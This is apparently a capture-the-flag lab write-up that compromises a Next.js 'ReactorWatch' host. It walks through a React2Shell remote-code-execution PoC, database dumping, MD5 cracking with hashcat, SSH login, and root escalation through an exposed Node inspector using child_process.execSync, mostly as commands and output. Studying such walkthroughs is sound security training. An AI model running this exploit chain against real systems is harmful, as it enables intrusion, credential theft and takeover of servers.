# Reactor — Proof of Concept

## Target

| Item | Value |
|---|---|
| Target | `10.129.245.214` |
| Web application | `ReactorWatch` |
| Web port | `3000/tcp` |
| SSH | `22/tcp` |
| Framework | Next.js |
| Initial user | `node` |
| Final user | `root` |

## 1. Discover the web application

The first full scan showed SSH, but the scan also hit retransmission limits. A direct check of port 3000 found the application:

```bash
nmap -Pn -p3000 -sC -sV 10.129.245.214
whatweb http://10.129.245.214:3000
```

Relevant result:

```text
3000/tcp open
X-Powered-By: Next.js
Title: ReactorWatch | Core Monitoring System
```

## 2. Confirm React2Shell

The target was tested with the React2Shell PoC:

```bash
git clone https://github.com/freeqaz/react2shell.git
cd react2shell
chmod +x detect.sh exploit-redirect.sh

./detect.sh http://10.129.245.214:3000
```

The detector returned:

```text
HTTP Status: 500
VULNERABLE - Server returned 500 with E{"digest" pattern
```

RCE was then confirmed with a harmless command:

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "id"
```

```text
uid=999(node) gid=988(node) groups=988(node)
```

## 3. Recover an SSH credential

The application directory contained an SQLite database:

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "ls -la /opt/reactor-app"
./exploit-redirect.sh http://10.129.245.214:3000 "sqlite3 /opt/reactor-app/reactor.db '.tables'"
./exploit-redirect.sh http://10.129.245.214:3000 "sqlite3 /opt/reactor-app/reactor.db '.schema'"
```

The `users` table stored password hashes. The hash recovered for `engineer` was:

```text
39d97110eafe2a9a68639812cd271e8e
```

Identify and crack it:

```bash
hashcat --identify '39d97110eafe2a9a68639812cd271e8e'

printf '%s\n' '39d97110eafe2a9a68639812cd271e8e' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
reactor1
```

## 4. SSH access

```bash
ssh engineer@10.129.245.214
```

Credentials:

```text
engineer : reactor1
```

User flag:

```bash
cat /home/engineer/user.txt
```

```text
b2d3a4478c04d2ef8eb692a3a833966d
```

## 5. Privilege escalation

`sudo` was not available:

```bash
sudo -l
```

The `lxd` group was present, but the host did not have a usable LXD installation.

Process enumeration revealed the important part:

```bash
ps aux | grep -E 'inspect|node'
ps -o user,pid,cmd -C node
```

```text
root  1382  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The Inspector was reachable from the `engineer` shell:

```bash
curl -s http://127.0.0.1:9229/json
```

It returned a WebSocket debugger URL for the root-owned Node process.

The supplied `node_inspector_poc.py` implements the WebSocket connection with Python's standard library and sends a Chrome DevTools Protocol `Runtime.evaluate` request.

The first test was:

```javascript
process.getuid()
```

The response contained:

```text
"value":0
```

UID 0 confirmed that the evaluated JavaScript was running in the root-owned Node process.

## 6. Root

The same primitive was used to execute a command through Node's child-process API:

```javascript
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

Root flag:

```text
9ecf367da57997b30e687019ea07df75
```

## Result

```text
USER  b2d3a4478c04d2ef8eb692a3a833966d
ROOT  9ecf367da57997b30e687019ea07df75
```
